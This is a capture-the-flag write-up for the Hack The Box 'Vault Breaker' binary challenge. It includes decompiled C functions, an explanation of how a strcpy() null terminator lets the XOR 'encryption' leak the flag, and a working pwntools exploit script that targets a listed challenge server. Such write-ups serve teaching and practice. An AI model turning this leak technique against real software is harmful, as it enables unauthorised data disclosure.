---
title: Binary Exploitation Writeup - Vault Breaker
published: true
date: 2025-02-09 00:00:00 +/-0000
categories: [general,ctf]
tags: [ctf,htb,binexp,binary exploitation,reverse engineering]     # TAG names should always be lowercase
image:
    path: /assets/images/2025/malware.jpg
---

This binary exploitation challenge was another exercise in performing a close reading of the source code. Rated "Very Easy" by Hack The Box, this `pwn` binary took the shortest amount of time relative to the ones looked at in the last week; having said that, I still managed to overlook what the exact vulnerability was on my first pass.

This challenge is shipped without any source code, so we're meant to both reverse engineer the binary and develop an exploit for it. Opening up the binary in `ghidra` shows a `main()` function that matches initial checks, showing 3 unique functions:

* `read_num()`
* `new_key_gen()`
* `secure_password()`

```c
void main(void)

{
  long lVar1;
  
  setup();
  banner();
  key_gen();
  fprintf(stdout,"%s\n[+] Random secure encryption key has been generated!\n%s",&DAT_00103142,
          &DAT_001012f8);
  fflush(stdout);
  while( true ) {
    while( true ) {
      printf(&DAT_00105160,&DAT_001012f8);
      lVar1 = read_num();
      if (lVar1 != 1) break;
      new_key_gen();
    }
    if (lVar1 != 2) break;
    secure_password();
  }
  printf("%s\n[-] Invalid option, exiting..\n",&DAT_00101300);
                    /* WARNING: Subroutine does not return */
  exit(0x45);
}
```

At a high-level, this binary prompts the user to pick an option from a limited menu; one option allows the user to help 'seed' a random key, the other prints the 'encrypted' version of the flag using the aforementioned key.

## read_num()

This is a unique function for setting the user's choice. It's not particularly remarkable, but on my first pass I did note that it allows for more user input to be `read()` in than what's strictly necessary. This didn't prove to be particularly noteworthy (and did get explained elsewhere in the codebase).

```c
void read_num(void)

{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&local_38,0x1f);
  strtoul((char *)&local_38,(char **)0x0,0);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

## new_key_gen()

The decompiled `new_key_gen()` function appears a little more dynamic (and explains a little more about the dynamism in `read_num()`).

1. The user is prompted to enter a value less than or equal to `0x1f` (31).
2. A number of bytes equal to the user's number is read into a buffer from [`/dev/urandom`](https://en.wikipedia.org/wiki//dev/random).
3. Those bytes are then copied to the `random_key` variable in memory.

```c
void new_key_gen(void)

{
  int iVar1;
  FILE *__stream;
  long in_FS_OFFSET;
  ulong local_60;
  ulong local_58;
  char local_48 [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_60 = 0;
  local_58 = 0x22;
  __stream = fopen("/dev/urandom","rb");
  if (__stream == (FILE *)0x0) {
    fprintf(stdout,"\n%sError opening /dev/urandom, exiting..\n",&DAT_00101300);
                    /* WARNING: Subroutine does not return */
    exit(0x15);
  }
  while (0x1f < local_58) {
    printf("\n[*] Length of new password (0-%d): ",0x1f);
    local_58 = read_num();
  }
  memset(local_48,0,0x20);
  iVar1 = fileno(__stream);
  read(iVar1,local_48,local_58);
  for (; local_60 < local_58; local_60 = local_60 + 1) {
    while (local_48[local_60] == '\0') {
      iVar1 = fileno(__stream);
      read(iVar1,local_48 + local_60,1);
    }
  }
  strcpy(random_key,local_48);
  fclose(__stream);
  printf("\n%s[+] New key has been genereated successfully!\n%s",&DAT_00103142,&DAT_001012f8);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

## secure_password()

The `secure_password()` was of particular interest to me since it's how the flag gets written into memory.

1. The function starts by printing some ASCII art, then opens up `flag.txt`.
2. We read in 23 bytes from `flag.txt` into a buffer
3. Each byte of the buffer is XOR'd against a corresponding byte from `random_key`.
4. The XOR'd bytes are printed to the screen.

```c
void secure_password(void)

{
  char *__buf;
  int __fd;
  ulong uVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char acStack_88 [24];
  undefined8 uStack_70;
  int local_68;
  int local_64;
  char *local_60;
  undefined8 local_58;
  char *local_50;
  FILE *local_48;
  undefined8 local_40;
  
  local_40 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  uStack_70 = 0x100c26;
  puts("\x1b[1;34m");
  uStack_70 = 0x100c4c;
  printf(&DAT_00101308,&DAT_001012f8,&DAT_00101300,&DAT_001012f8);
  local_60 = &DAT_00101330;
  local_64 = 0x17;
  local_58 = 0x16;
  local_50 = acStack_88;
  memset(acStack_88,0,0x17);
  local_48 = fopen("flag.txt","rb");
  __buf = local_50;
  if (local_48 == (FILE *)0x0) {
    fprintf(stderr,"\n%s[-] Error opening flag.txt, contact an Administrator..\n",&DAT_00101300);
                    /* WARNING: Subroutine does not return */
    exit(0x15);
  }
  sVar2 = (size_t)local_64;
  __fd = fileno(local_48);
  read(__fd,__buf,sVar2);
  fclose(local_48);
  puts(local_60);
  fwrite("\nMaster password for Vault: ",1,0x1c,stdout);
  local_68 = 0;
  while( true ) {
    uVar1 = (ulong)local_68;
    sVar2 = strlen(local_50);
    if (sVar2 <= uVar1) break;
    putchar((int)(char)(random_key[local_68] ^ local_50[local_68]));
    local_68 = local_68 + 1;
  }
  puts("\n");
                    /* WARNING: Subroutine does not return */
  exit(0x1b39);
}
```

## Game plan

From the get-go, I figured solving this binary locally would be no problem. I could hook `GDB` onto the process, then I could just see the bytes as they're being passed. The trouble comes from the remote debugging. Unless `gdbserver` was running on the target machine, I wouldn't be able to do this.

Looking over the code doesn't show any other forms of input, nothing exploitable in terms of format strings, or buffer overflows. I was going bonkers trying to figure out what exactly to exploit when I noticed something interesting. At one point I was consistently entering in the same key length (0) and saw the following "encrypted" outputs:

```
H+q���X���96��.�Jo�
H��l�]Ԙ莦�f���ס7�?▒
H)��&������k}P�!�]�|�
H�`����.i�N9r�hdDǃ
```
Why was it that the first byte was consistently presenting itself as "H"? The pseudo-random number generator in `/dev/urandom` should make *all* of the bytes be random. The answer - it turns out - was `strcpy()` in `new_key_gen()`. For those unfamiliar, `strcpy()` appends a null byte (`\0`) to the end of whatever it copies; when I was consistently listing my key length as 0, it was writing a null byte as the first value to `random_key`. And since any value XOR'd against null is itself, each time I was calling `secure_password()` I was revealing the first character of the flag.

![alt text](/assets/images/2025/XOR-self.png)

So to solve this we can either:

* Run the process repeatedly, incrementing the key length each time and noting the decrypted character OR...
* Run `new_key_gen()` repeatedly, then `secure_password()` once.

The latter option strikes me as cleaner, so I'll be performing that one.

```python
#!/usr/bin/env python3
import sys

from pwn import *

context.update(arch='amd64', os='linux')


binstr = "./vault-breaker"
ip = "94.237.60.159"
port = 45736

#    break *0x56555d36
if (len(sys.argv)<= 1):
    p = process(binstr)
elif (sys.argv[1] == "dbg"):
    p = gdb.debug([binstr],'''
    unset env LINES
    unset env COLUMNS
    break *0x555555555cbd
    continue
    ''')
elif (sys.argv[1] == "remote"):
    p = remote(ip,port)
else:
    print(f"Invalid argument to e.py: '{sys.argv[1]}'. Did you mean 'dbg'?")
    sys.exit(1)

for i in range(31,-1,-1):
    p.sendlineafter(b'\n> ', b'1')
    p.sendlineafter(b'(0-31): ', str(i).encode())

p.sendlineafter(b'\n> ', b'2')

p.interactive()
```

## Learning Outcomes

* This one felt more about reinforcing elements from earlier in the week. Nothing huge, but still great.
* The biggest value from this one lay in the code review. It's worth banking information like which functions can add null terminators (like `strcpy()`).
